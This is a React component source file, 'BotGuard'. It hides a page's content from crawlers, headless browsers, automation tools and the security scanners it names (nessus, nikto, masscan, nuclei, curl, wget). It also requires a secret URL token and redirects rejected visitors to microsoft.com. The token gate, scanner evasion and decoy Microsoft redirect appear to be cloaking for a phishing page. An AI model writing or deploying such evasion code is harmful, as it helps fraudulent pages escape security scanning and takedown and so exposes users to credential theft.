import { useEffect, useState } from "react";

const BOT_AGENTS = [
  "googlebot", "bingbot", "slurp", "duckduckbot", "baiduspider",
  "yandexbot", "sogou", "exabot", "facebot", "ia_archiver",
  "semrushbot", "ahrefsbot", "mj12bot", "dotbot", "rogerbot",
  "screaming frog", "phantomjs", "headlesschrome", "selenium",
  "puppeteer", "playwright", "crawl", "spider", "bot", "scraper",
  "nessus", "nikto", "masscan", "zgrab", "nuclei", "curl", "wget",
  "python-requests", "go-http-client", "java/", "libwww", "httpclient",
  "axios", "okhttp", "apache-httpclient", "postman", "insomnia",
];

const SUSPICIOUS_SCREEN_SIZES = [
  { w: 800, h: 600 },
  { w: 1024, h: 768 },
  { w: 0, h: 0 },
];

function checkUserAgent() {
  const ua = navigator.userAgent.toLowerCase();
  return BOT_AGENTS.some((b) => ua.includes(b));
}

function checkHeadless() {
  // webdriver flag
  if (navigator.webdriver) return true;

  // missing chrome runtime in chrome-like browser
  if (!window.chrome && /chrome/.test(navigator.userAgent.toLowerCase())) return true;

  // no languages
  if (!navigator.languages || navigator.languages.length === 0) return true;

  // no plugins (headless chrome has none)
  if (navigator.plugins.length === 0 && !/firefox/.test(navigator.userAgent.toLowerCase())) return true;

  // phantom js
  if (window._phantom || window.__nightmare || window.callPhantom) return true;

  // selenium artifacts
  if (document.documentElement.getAttribute("webdriver")) return true;
  if (window.domAutomation || window.domAutomationController) return true;

  // cdc_ variables injected by chromedriver
  const cdcKeys = Object.keys(window).filter(k => k.startsWith("cdc_"));
  if (cdcKeys.length > 0) return true;

  return false;
}

function checkScreenSize() {
  const w = window.screen.width;
  const h = window.screen.height;

  // zero dimensions
  if (w === 0 || h === 0) return true;

  // known headless default sizes
  if (SUSPICIOUS_SCREEN_SIZES.some(s => s.w === w && s.h === h)) return true;

  // window bigger than screen (impossible for real browser)
  if (window.outerWidth > window.screen.width || window.outerHeight > window.screen.height) return true;

  return false;
}

function checkTiming() {
  // bots load pages extremely fast
  const loadTime = performance.now();
  if (loadTime < 50) return true;
  return false;
}

function checkPermissions() {
  // real browsers have notification permission API
  if (!navigator.permissions) return true;
  return false;
}

function checkConnectionType() {
  // headless browsers often have no connection info
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (conn && conn.rtt === 0 && conn.downlink === 0) return true;
  return false;
}

function checkToken() {
  // if TOKEN is set in env, require it in URL
  const requiredToken = process.env.REACT_APP_ACCESS_TOKEN;
  if (!requiredToken) return true; // no token required
  const params = new URLSearchParams(window.location.search);
  const urlToken = params.get("t");
  return urlToken === requiredToken;
}

function isBot() {
  if (checkUserAgent()) return true;
  if (checkHeadless()) return true;
  if (checkScreenSize()) return true;
  if (checkTiming()) return true;
  if (!checkPermissions()) return false; // don't block if permissions API missing (some mobile)
  if (checkConnectionType()) return true;
  return false;
}

export default function BotGuard({ children }) {
  const [allowed, setAllowed] = useState(false);
  const [humanDetected, setHumanDetected] = useState(false);

  useEffect(() => {
    // check token first
    if (!checkToken()) {
      window.location.replace("https://www.microsoft.com");
      return;
    }

    // immediately redirect bots
    if (isBot()) {
      window.location.replace("https://www.microsoft.com");
      return;
    }

    // wait for human interaction signal
    const onHuman = () => setHumanDetected(true);
    window.addEventListener("mousemove", onHuman, { once: true });
    window.addEventListener("touchstart", onHuman, { once: true });
    window.addEventListener("keydown", onHuman, { once: true });
    window.addEventListener("scroll", onHuman, { once: true });
    window.addEventListener("click", onHuman, { once: true });

    // fallback for mobile after 4 seconds
    const timer = setTimeout(() => setHumanDetected(true), 4000);

    return () => {
      window.removeEventListener("mousemove", onHuman);
      window.removeEventListener("touchstart", onHuman);
      window.removeEventListener("keydown", onHuman);
      window.removeEventListener("scroll", onHuman);
      window.removeEventListener("click", onHuman);
      clearTimeout(timer);
    };
  }, []);

  useEffect(() => {
    if (humanDetected) setAllowed(true);
  }, [humanDetected]);

  if (!allowed) return null;
  return children;
}
